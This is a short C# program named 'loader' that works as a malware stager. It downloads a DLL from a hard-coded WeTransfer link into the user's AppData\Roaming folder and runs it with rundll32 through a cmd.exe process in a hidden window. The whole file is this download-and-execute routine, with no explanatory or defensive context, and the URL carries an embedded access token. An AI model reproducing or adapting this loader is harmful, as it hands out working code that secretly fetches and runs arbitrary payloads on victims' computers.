using System;
using System.Net;

namespace loader {
    public class Program {
    
        public static void GetFile(string url, string filename) {
            string currentUser = Environment.UserName;
            string downloadPath = @$"C:\Users\{currentUser}\AppData\Roaming\{filename}";
            using(WebClient myWebClient = new WebClient()) {
                
                myWebClient.DownloadFile(url, downloadPath);
            }
        }

        public static void RunCommand(string command) {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = command;
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
            string currentUser = Environment.UserName;
            GetFile(remoteDllUrl, localDllName);
            string localDllPath = @$"C:\Users\{currentUser}\AppData\Roaming\{localDllName}"; 
            string command = $"/c rundll32.exe {localDllPath},{dllEntryName}";
            RunCommand(command);
        }

        public static void Main(string[] args) {

            string remoteDllUrl = "https://download.wetransfer.com/usgv/799b278980418bdb80d060800d4fe6d320220226212808/65ee11d1690bf5d72aad199c45da6ac468ce6f6a/user.dll?token=eyJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDU5MTA5NDEsImV4cCI6MTY0NTkxMTU0MSwidW5pcXVlIjoiNzk5YjI3ODk4MDQxOGJkYjgwZDA2MDgwMGQ0ZmU2ZDMyMDIyMDIyNjIxMjgwOCIsImZpbGVuYW1lIjoidXNlci5kbGwiLCJ3YXliaWxsX3VybCI6Imh0dHA6Ly9zdG9ybS1pbnRlcm5hbC5zZXJ2aWNlLnVzLWVhc3QtMS53ZXRyYW5zZmVyLm5ldC9hcGkvd2F5YmlsbHM_c2lnbmVkX3dheWJpbGxfaWQ9ZXlKZmNtRnBiSE1pT25zaWJXVnpjMkZuWlNJNklrSkJhSE5MZDJWRlRtcEdjaUlzSW1WNGNDSTZJakl3TWpJdE1ESXRNalpVTWpFNk16azZNREV1TURBd1dpSXNJbkIxY2lJNkluZGhlV0pwYkd4ZmFXUWlmWDAtLTc3Mjg2ZWI1ZWI0YjIyZjQ1ZmJkMjgzYzEzZmMzYjQ1ZmRlZTVjNDcxNTY1OGEzMzIxYjE2MTQ4ZGNiOTc1ZjUiLCJmaW5nZXJwcmludCI6IjY1ZWUxMWQxNjkwYmY1ZDcyYWFkMTk5YzQ1ZGE2YWM0NjhjZTZmNmEiLCJjYWxsYmFjayI6IntcImZvcm1kYXRhXCI6e1wiYWN0aW9uXCI6XCJodHRwOi8vZnJvbnRlbmQuc2VydmljZS5ldS13ZXN0LTEud2V0cmFuc2Zlci5uZXQvd2ViaG9va3MvYmFja2VuZFwifSxcImZvcm1cIjp7XCJ0cmFuc2Zlcl9pZFwiOlwiNzk5YjI3ODk4MDQxOGJkYjgwZDA2MDgwMGQ0ZmU2ZDMyMDIyMDIyNjIxMjgwOFwiLFwiZG93bmxvYWRfaWRcIjoxNDUyNjM5MjU3M319In0.uU8SPnlk_MFMQZCjuweg7TYeJoE-Ytr9xH8j5b53K0w&cf=y";
            string localDllName = "user.dll";
            string dllEntryName = "DllMain";
            DllLoader(remoteDllUrl, localDllName, dllEntryName);
        }
    }
}
